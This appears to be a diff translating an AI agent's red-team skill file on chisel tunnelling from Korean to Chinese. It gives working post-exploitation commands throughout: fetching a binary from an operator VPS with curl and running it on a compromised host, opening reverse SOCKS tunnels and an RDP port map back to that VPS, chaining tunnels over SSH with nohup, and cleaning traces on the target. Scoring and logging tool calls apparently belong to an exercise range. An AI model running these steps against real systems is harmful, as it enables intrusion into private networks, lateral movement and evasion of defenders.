@@ -1,115 +1,115 @@
 ---
 name: chisel-tunnel
-description: chisel 터널: HTTP/WebSocket 으로 캡슐화한 다중화 터널이라 외부 통신 제한과 리버스 프록시를 가장 쉽게 통과한다
-whenToUse: suo5 를 쓸 수 없을 때(WebShell 진입점이 아님), 대상이 HTTP 만 나갈 수 있을 때, 포트 포워딩이나 안정적인 SOCKS 가 필요할 때
+description: chisel 隧道：HTTP/WebSocket 封装的多路复用隧道，最易穿透出网限制与反向代理
+whenToUse: suo5 不适用（非 WebShell 入口）、目标只能出 HTTP、需要端口转发或稳定 SOCKS 时
 role: internal
 enabled: true
 ---
 
-# chisel(HTTP 터널 / 포트 포워딩)
+# chisel（HTTP 隧道 / 端口转发）
 
-> **먼저 VPS 설정을 로드한다**: 이 스킬의 모든 `$REDTEAM_VPS_HOST` / `$VPS_USER` 는 로컬 설정에서 오고,
-> 최초에는 `bash $DSH_HOME/redteam/setup.sh` 가 `$DSH_HOME/.env` 에 기록한다. 명령마다 앞에서 한 번 source 한다:
+> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
+> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
 > ```bash
 > set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
 > VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
 > ```
-> 설정한 적이 없으면 `setup.sh` 를 한 번 실행한다(스킬 `redteam-setup`). SSH 연결성과 페이로드 서비스도 함께 검증된다.
+> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。
 
-`chisel` 은 TCP 트래픽을 **HTTP/WebSocket** 으로 감싼다. 그래서 **80/443 만 허용하는 외부 통신 정책과 리버스 프록시를 가장 쉽게 통과한다**.
-suo5 와의 역할 분담:
+`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。
+它和 suo5 的分工：
 
 | | suo5 | chisel |
 | --- | --- | --- |
-| 진입 전제 | **WebShell 이 반드시 있어야 한다**(HTTP 채널) | **명령 실행만 되면 된다**(바이너리를 돌릴 수 있으면 충분) |
-| 전송 | HTTP 장기 연결(정상 요청으로 위장) | HTTP/WebSocket(upgrade) |
-| 강점 | Web 진입점에서 내부망 진입, 사용자가 재사용 가능 | 셸/RCE 진입점에서 내부망 진입, 유연한 포트 포워딩 |
-| 노이즈 | 낮음(평범한 Web 요청처럼 보임) | 낮음~중간(WebSocket 특징이 조금 더 뚜렷하다) |
+| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |
+| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |
+| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
+| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |
 
-**선택 기준**: WebShell 이 있으면 → `suo5-tunnel` 우선; 명령 실행/RCE 만 있거나 정밀한 포트 포워딩이 필요하면 → chisel.
+**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。
 
-## 로컬 바이너리
+## 本机二进制
 
-| 파일 | 경로 |
+| 文件 | 路径 |
 | --- | --- |
-| chisel(Linux amd64, 서버와 클라이언트가 같은 바이너리) | `$DSH_HOME/redteam/toolkit/chisel/chisel`(v1.12.0) |
+| chisel（Linux amd64，服务端与客户端同一个二进制） | `$DSH_HOME/redteam/toolkit/chisel/chisel`（v1.12.0） |
 
-VPS 페이로드 디렉터리에도 동기화되어 있다: `http://$REDTEAM_VPS_HOST:9100/`(대상에서 `curl` 로 바로 받을 수 있다).
+已同步到 VPS 载荷目录：`http://$REDTEAM_VPS_HOST:9100/`（目标可 `curl` 直接拉）。
 
-## 1. 역방향 SOCKS(가장 많이 쓴다: 대상이 먼저 우리에게 접속)
+## 一、反向 SOCKS（最常用：目标主动连我们）
 
 ```bash
-# 1) 우리 VPS 에서 서버 기동(tmux 안에서 실행한다. SSH 가 끊기며 죽지 않게)
+# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）
 tmux new -s chisel
 $DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
-#    --reverse  클라이언트의 역방향 터널 등록 허용
-#    --socks5   내장 SOCKS5 시작(클라이언트가 붙으면 이 포트를 쓸 수 있다)
-#    선택 강화: --auth user:pass   인증을 붙여 스캔당해 무단 사용되는 것을 막는다
-#    선택 위장: --backend http://127.0.0.1:80  Web 트래픽을 로컬 사이트로 전달한다
+#    --reverse  允许客户端注册反向隧道
+#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）
+#    可选加固：--auth user:pass   加认证，避免被扫到白用
+#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点
 
-# 2) 대상 측 클라이언트 기동(이미 있는 RCE/명령 실행 지점으로 실행; 바이너리를 먼저 올린다)
+# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）
 curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
 /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
-#    R:socks = 역방향 SOCKS; 연결되면 VPS 의 1080 포트가 내부망 SOCKS5 진입점이 된다
+#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口
 
-# 3) 로컬에서 VPS 의 SOCKS 를 통해 내부망 접근
+# 3) 本机通过 VPS 的 SOCKS 访问内网
 proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
-#    runs/proxychains-1080.conf 에 기록: socks5 $REDTEAM_VPS_HOST 1080
-#    ⛔ 시스템 /etc/proxychains4.conf 를 고치지 않는다. -f 로 runs/ 아래 임시 설정을 가리킨다
+#    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080
+#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
 ```
 
-## 2. 역방향 포트 포워딩(내부망의 특정 포트를 밖으로 매핑)
+## 二、反向端口转发（把内网某个端口映射出来）
 
 ```bash
-# 대상 측: 내부망 10.0.0.5:3389 를 VPS 의 13389 로 매핑
+# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389
 /tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
-# 로컬: VPS:13389 에 바로 연결하면 내부망 3389 이다
+# 本机：直接连 VPS:13389 即为内网 3389
 rdesktop $REDTEAM_VPS_HOST:13389
 ```
 
-## 3. 정방향 SOCKS(대상이 우리에게 직접 연결할 수 있고, 우리가 대상 내부망으로 먼저 접속할 때)
+## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）
 
 ```bash
-# 대상 측에서 서버 기동
+# 目标侧起服务端
 /tmp/c server -p 9443 --socks5
-# 우리 측에서 클라이언트로 로컬 포워딩
+# 我方起客户端做本地转发
 chisel client <target>:9443 1080:socks
-# 이후 proxychains 를 127.0.0.1:1080 으로 향하게 한다
+# 之后 proxychains 指向 127.0.0.1:1080
 ```
 
-## 4. 다단계 / 연동
+## 四、多级 / 联动
 
 ```bash
-# 이미 A 터널(suo5 → 127.0.0.1:1080)이 있고, A 를 통해 내부망 호스트 B 에서 chisel 을 또 띄운다
+# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
 proxychains4 -f runs/proxychains-1080.conf \
   ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
-# 단계마다 도달 범위를 넓히고, 층마다 터널과 도달 대역을 등록한다
+# 逐层扩大可达范围，每层都要登记隧道与可达网段
 ```
 
-## 5. 규율과 자체 보호
+## 五、纪律与自保
 
-1. **반드시 tmux / nohup 안에서 돌린다**: 세션이 끊기면 터널이 사라진다(`nohup ... &` 또는 `tmux`).
-2. **서버에 인증을 붙인다**: 공인망 VPS 의 chisel 서버는 포트 스캔을 당한다. `--auth user:pass` 를 붙이고, 사용 후 `pkill` 로 끈다.
-3. **포트 선택**: 80/443 을 쓰지 않는다(VPS 의 다른 서비스가 점유했을 수 있다). 9443/8443 같은 상위 포트를 쓰고,
-   **VPS 보안 그룹에서 허용**해야 한다.
-4. **대상 측 흔적과 파일을 정리한다**: `/tmp/c` 는 사용 후 삭제할 수 있다; 눈에 띄는 특징이 있는 경로에 바이너리를 두지 않는다.
-5. **자체 VPS 의 프록시를 "돌파"로 위장하지 않는다**: 터널 등록의 `entry_kind` 는 대상 측 끝단을 분명히 적는다(아래 참조).
+1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。
+2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。
+3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；
+   **VPS 安全组要放行**。
+4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。
+5. **不要用自建 VPS 上的代理冒充"突破"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。
 
-## 6. 출력과 적재(강제)
+## 六、输出与落库（强制）
 
-1. **터널을 `redteam_tunnel_add` 로 등록**하고 필드를 모두 채운다:
-   - `kind`: `chisel`;
-   - `listen`: **사용자가 실제로 쓸 수 있는 리스닝 주소**(예: `$REDTEAM_VPS_HOST:1080` 또는 `127.0.0.1:1080`);
-   - `entry`: 대상 측 진입점(예: `10.0.0.6 의 /tmp/c 클라이언트 → VPS:9443`);
-   - `reach`: **도달 가능 대역**(예: `10.0.0.0/24`, 실측 후에 채운다. 추측하지 않는다);
-   - `entry_kind`: 반드시 `target-outbound`(대상이 리버스하거나 대상에서 chisel 클라이언트를 돌린 경우) 또는
-     `target-http`(대상 WebShell 경유), `target-agent`(대상의 장악된 프로세스 경유);
-     ⛔ 자체 VPS 에서만 프록시를 열었다면 `self-only` 로 적는다 —— **"돌파로 인정되지 않음" 으로 표시된다**;
-   - `command`: 전체 명령 원문(서버 + 클라이언트 양쪽 모두).
-2. **연결성을 실측한다**: `curl --socks5-hostname <listen> http://<내부망 대상>/` 또는 `proxychains4 -f ... curl ...`,
-   통과해야 터널이 성립한다; 그다음 `redteam_session_check` 로 상태를 환류한다.
-3. **득점**: 터널이 내부망에 도달하면 → `redteam_score_hit`(`boundary`, evidence 에 "터널 주소|도달 대역|실측 접근한 내부망 대상" 을 쓴다);
-   그것으로 다른 호스트로 횡적 이동하면 → `server-host`.
-4. **사용자에게 인계**: 바로 붙여넣을 수 있는 설정을 준다 —— `socks5://<listen>`(또는 `ssh -D` / frp 로 사용자 머신에 매핑하는 방법),
-   리스닝 주소와 포트를 분명히 쓰고, 이 터널이 표적 경계를 넘었다는 점을 설명한다.
-5. 핵심 동작마다 `redteam_chain_add`(`stage_code=boundary-logical`), `tool` 에 명령 원문, `result` 에 회신 요약.
+1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：
+   - `kind`：`chisel`；
+   - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；
+   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
+   - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
+   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
+     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
+     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
+   - `command`：完整命令原文（服务端 + 客户端两段都要）。
+2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
+   通了才算隧道成立；然后 `redteam_session_check` 回写状态。
+3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
+   通过它横向到其它主机 → `server-host`。
+4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
+   写清监听地址与端口，并说明该隧道跨越了靶标边界。
+5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。
